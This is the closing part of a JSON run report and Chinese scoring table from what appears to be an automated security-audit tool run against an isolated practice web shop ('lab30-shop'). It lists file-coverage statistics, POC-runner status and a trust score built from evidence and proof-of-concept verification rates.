          "peak_request_bytes": 63269,
          "requests": 2,
          "summary_requests": 0,
          "limit_hits": 0
        },
        "poc_execute": {
          "peak_request_bytes": 84621,
          "requests": 8,
          "summary_requests": 0,
          "limit_hits": 0
        },
        "poc_conclude": {
          "peak_request_bytes": 65281,
          "requests": 2,
          "summary_requests": 0,
          "limit_hits": 0
        }
      }
    },
    "blocked_task_ids": [
      "7b4589aa304049d199f04f1a8c24bc2a",
      "0174c106b47a4d3e940a14f98122273a",
      "17d822b7e36243458d0b8ff5fd9e6856",
      "cdb5044da4074ba5927bf5d49ad77edd",
      "219938f1395d47099da2b8834d7ffd68"
    ],
    "poc": {
      "available": true,
      "reason": "ready",
      "message": "隔离 POC runner 已就绪。",
      "checked_at": "2026-10-27T18:01:07.094875+00:00",
      "mode": "auto",
      "target_profile": "lab30",
      "target": "lab30",
      "capabilities": {
        "supported_targets": [
          "lab30"
        ],
        "php": true,
        "python": true,
        "browser": true,
        "verification_contexts": true,
        "identity_preconditions": true,
        "idempotent_jobs": true,
        "idempotent_http_jobs": true,
        "idempotent_browser_jobs": true
      },
      "legacy": false
    },
    "final_summary_available": false,
    "coverage_review": {
      "version": "coverage-review-v1",
      "total": 61,
      "pending_total": 0,
      "pending_paths": [],
      "read_paths": [
        "lab30-shop/app/bin/reset.php",
        "lab30-shop/app/bin/setup.php",
        "lab30-shop/app/public/account/backup.php",
        "lab30-shop/app/public/account/index.php",
        "lab30-shop/app/public/account/me.php",
        "lab30-shop/app/public/account/profile.php",
        "lab30-shop/app/public/account/redeem.php",
        "lab30-shop/app/public/account/settings.php",
        "lab30-shop/app/public/account/update.php",
        "lab30-shop/app/public/assets/app.js",
        "lab30-shop/app/public/auth/continue.php",
        "lab30-shop/app/public/auth/login.php",
        "lab30-shop/app/public/auth/logout.php",
        "lab30-shop/app/public/auth/register.php",
        "lab30-shop/app/public/catalog/detail.php",
        "lab30-shop/app/public/catalog/greeting.php",
        "lab30-shop/app/public/catalog/index.php",
        "lab30-shop/app/public/content/page.php",
        "lab30-shop/app/public/health.php",
        "lab30-shop/app/public/index.php",
        "lab30-shop/app/public/ops/audit-log.php",
        "lab30-shop/app/public/ops/batch-check.php",
        "lab30-shop/app/public/ops/database.php",
        "lab30-shop/app/public/ops/formula.php",
        "lab30-shop/app/public/ops/index.php",
        "lab30-shop/app/public/ops/jobs.php",
        "lab30-shop/app/public/ops/maintenance.php",
        "lab30-shop/app/public/ops/members.php",
        "lab30-shop/app/public/ops/ping.php",
        "lab30-shop/app/public/ops/report.php",
        "lab30-shop/app/public/ops/template-preview.php",
        "lab30-shop/app/public/ops/template-render.php",
        "lab30-shop/app/public/ops/url-preview.php",
        "lab30-shop/app/public/ops/users.php",
        "lab30-shop/app/public/ops/xml-import.php",
        "lab30-shop/app/public/orders/create.php",
        "lab30-shop/app/public/orders/detail.php",
        "lab30-shop/app/public/orders/index.php",
        "lab30-shop/app/public/partner/portal.php",
        "lab30-shop/app/public/partner/token.php",
        "lab30-shop/app/public/support/download.php",
        "lab30-shop/app/public/support/index.php",
        "lab30-shop/app/public/support/messages.php",
        "lab30-shop/app/public/wallet/index.php",
        "lab30-shop/app/public/wallet/withdraw.php",
        "lab30-shop/app/resources/views/home.php",
        "lab30-shop/app/resources/views/shipping.php",
        "lab30-shop/app/src/backup.php",
        "lab30-shop/app/src/bootstrap.php",
        "lab30-shop/app/src/dispatch_job.php",
        "lab30-shop/app/src/host_check.php",
        "lab30-shop/app/src/member_lookup.php",
        "lab30-shop/app/src/setup.php",
        "lab30-shop/bin/lab",
        "lab30-shop/bin/package.py",
        "lab30-shop/compose.yaml",
        "lab30-shop/docker/apache.conf",
        "lab30-shop/docker/entrypoint.sh",
        "lab30-shop/docker/php.ini",
        "lab30-shop/fixtures/server.py"
      ],
      "reviewed_paths": [
        "lab30-shop/app/bin/reset.php",
        "lab30-shop/app/bin/setup.php",
        "lab30-shop/app/public/account/backup.php",
        "lab30-shop/app/public/account/index.php",
        "lab30-shop/app/public/account/me.php",
        "lab30-shop/app/public/account/profile.php",
        "lab30-shop/app/public/account/redeem.php",
        "lab30-shop/app/public/account/settings.php",
        "lab30-shop/app/public/account/update.php",
        "lab30-shop/app/public/assets/app.js",
        "lab30-shop/app/public/assets/products.svg",
        "lab30-shop/app/public/auth/continue.php",
        "lab30-shop/app/public/auth/login.php",
        "lab30-shop/app/public/auth/logout.php",
        "lab30-shop/app/public/auth/register.php",
        "lab30-shop/app/public/catalog/detail.php",
        "lab30-shop/app/public/catalog/greeting.php",
        "lab30-shop/app/public/catalog/index.php",
        "lab30-shop/app/public/content/page.php",
        "lab30-shop/app/public/health.php",
        "lab30-shop/app/public/index.php",
        "lab30-shop/app/public/ops/audit-log.php",
        "lab30-shop/app/public/ops/batch-check.php",
        "lab30-shop/app/public/ops/database.php",
        "lab30-shop/app/public/ops/formula.php",
        "lab30-shop/app/public/ops/index.php",
        "lab30-shop/app/public/ops/jobs.php",
        "lab30-shop/app/public/ops/maintenance.php",
        "lab30-shop/app/public/ops/members.php",
        "lab30-shop/app/public/ops/ping.php",
        "lab30-shop/app/public/ops/report.php",
        "lab30-shop/app/public/ops/template-preview.php",
        "lab30-shop/app/public/ops/template-render.php",
        "lab30-shop/app/public/ops/url-preview.php",
        "lab30-shop/app/public/ops/users.php",
        "lab30-shop/app/public/ops/xml-import.php",
        "lab30-shop/app/public/orders/create.php",
        "lab30-shop/app/public/orders/detail.php",
        "lab30-shop/app/public/orders/index.php",
        "lab30-shop/app/public/partner/portal.php",
        "lab30-shop/app/public/partner/token.php",
        "lab30-shop/app/public/support/download.php",
        "lab30-shop/app/public/support/index.php",
        "lab30-shop/app/public/support/messages.php",
        "lab30-shop/app/public/wallet/index.php",
        "lab30-shop/app/public/wallet/withdraw.php",
        "lab30-shop/app/resources/views/home.php",
        "lab30-shop/app/resources/views/shipping.php",
        "lab30-shop/app/src/backup.php",
        "lab30-shop/app/src/bootstrap.php",
        "lab30-shop/app/src/dispatch_job.php",
        "lab30-shop/app/src/host_check.php",
        "lab30-shop/app/src/member_lookup.php",
        "lab30-shop/app/src/setup.php",
        "lab30-shop/bin/lab",
        "lab30-shop/bin/package.py",
        "lab30-shop/compose.yaml",
        "lab30-shop/docker/apache.conf",
        "lab30-shop/docker/entrypoint.sh",
        "lab30-shop/docker/php.ini",
        "lab30-shop/fixtures/server.py"
      ],
      "skips": [
        {
          "path": "lab30-shop/app/public/assets/products.svg",
          "action": "skip",
          "reason": "静态 SVG 图片资源，无服务端执行路径；其被引用的页面已由其他任务覆盖，不含可被外部输入触发的漏洞 sink。"
        },
        {
          "path": "lab30-shop/fixtures/server.py",
          "action": "skip",
          "reason": "待 fixtures-server-harness 任务核对运行时角色后再定；若为本地测试夹具，将由该任务结论给出跳过依据。"
        }
      ],
      "complete": true,
      "notice": "已读只表示宿主记录过读取，不证明每行或每种风险已审计；跳过项保留理由，不是安全结论。"
    }
  },
  "coverage": {
    "files_total": 69,
    "files_read": 64,
    "files_with_findings": 34,
    "coverage_ratio": 0.9275,
    "read_paths": [
      "lab30-shop/README.md",
      "lab30-shop/app/bin/reset.php",
      "lab30-shop/app/bin/setup.php",
      "lab30-shop/app/public/account/backup.php",
      "lab30-shop/app/public/account/index.php",
      "lab30-shop/app/public/account/me.php",
      "lab30-shop/app/public/account/profile.php",
      "lab30-shop/app/public/account/redeem.php",
      "lab30-shop/app/public/account/settings.php",
      "lab30-shop/app/public/account/update.php",
      "lab30-shop/app/public/assets/app.css",
      "lab30-shop/app/public/assets/app.js",
      "lab30-shop/app/public/auth/continue.php",
      "lab30-shop/app/public/auth/login.php",
      "lab30-shop/app/public/auth/logout.php",
      "lab30-shop/app/public/auth/register.php",
      "lab30-shop/app/public/catalog/detail.php",
      "lab30-shop/app/public/catalog/greeting.php",
      "lab30-shop/app/public/catalog/index.php",
      "lab30-shop/app/public/content/page.php",
      "lab30-shop/app/public/health.php",
      "lab30-shop/app/public/index.php",
      "lab30-shop/app/public/ops/audit-log.php",
      "lab30-shop/app/public/ops/batch-check.php",
      "lab30-shop/app/public/ops/database.php",
      "lab30-shop/app/public/ops/formula.php",
      "lab30-shop/app/public/ops/index.php",
      "lab30-shop/app/public/ops/jobs.php",
      "lab30-shop/app/public/ops/maintenance.php",
      "lab30-shop/app/public/ops/members.php",
      "lab30-shop/app/public/ops/ping.php",
      "lab30-shop/app/public/ops/report.php",
      "lab30-shop/app/public/ops/template-preview.php",
      "lab30-shop/app/public/ops/template-render.php",
      "lab30-shop/app/public/ops/url-preview.php",
      "lab30-shop/app/public/ops/users.php",
      "lab30-shop/app/public/ops/xml-import.php",
      "lab30-shop/app/public/orders/create.php",
      "lab30-shop/app/public/orders/detail.php",
      "lab30-shop/app/public/orders/index.php"
    ],
    "unread_hot_modules": [
      {
        "module": "lab30-shop",
        "unread": 5,
        "total": 69
      }
    ],
    "dependency_tree_total": 0,
    "dependency_tree_read": 0,
    "notice": "覆盖统计来自已持久化的 worker 读记录与冻结项目图，不是安全结论，也不能作为 finding 证据；read_paths 最多列 40 条，unread_hot_modules 最多列 12 个，最近 200 次尝试之外的读记录未计入。"
  }
}
```

### 防御与可信度评分

总分 **0.719**（按可用成分权重归一化，分母 0.4）。

| 成分 | 来源 | 权重 | 取值 | 说明 |
|---|---|---:|---:|---|
| 证据校验通过率 | 本次运行 | 0.2 | 1.000 | 52/52 条候选通过源码证据校验 |
| POC 验证通过率 | 本次运行 | 0.2 | 0.438 | 21/48 次自动验证判为已验证 |
| Planner 复核通过率 | 本次运行 | 0.2 | 缺失 | 没有需要核实的自动验证结论 |
| 注入抵抗率 | 基准实验 | 0.2 | 缺失 | 还没有完成的 Prompt 对比实验 |
| 证据链完整率 | 基准实验 | 0.2 | 缺失 | 还没有完成的 Prompt 对比实验 |

未计入成分：review、injection、chain（缺失时不按 0 分代入）。
